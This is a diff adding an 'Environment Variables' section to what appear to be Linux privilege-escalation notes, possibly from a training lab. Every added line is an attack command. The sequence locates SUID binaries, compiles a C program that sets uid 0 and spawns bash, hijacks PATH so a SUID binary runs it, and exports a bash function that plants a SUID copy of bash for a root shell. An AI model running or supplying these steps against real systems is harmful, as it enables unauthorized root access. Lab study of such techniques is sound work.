@@ -62,7 +62,20 @@
 
 
 
-
+   ####  Environment Variables
+                
+    env
+    find / -type f -perm -04000 -ls 2>/dev/null
+    /usr/local/bin/suid-env
+    strings /usr/local/bin/suid-env
+    echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+    gcc /tmp/service.c -o /tmp/service
+    export PATH=/tmp:$PATH
+    print $PATH
+    /usr/local/bin/suid-env
+    function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+    export -f /usr/sbin/service
+    /usr/local/bin/suid-env2
 
 
 
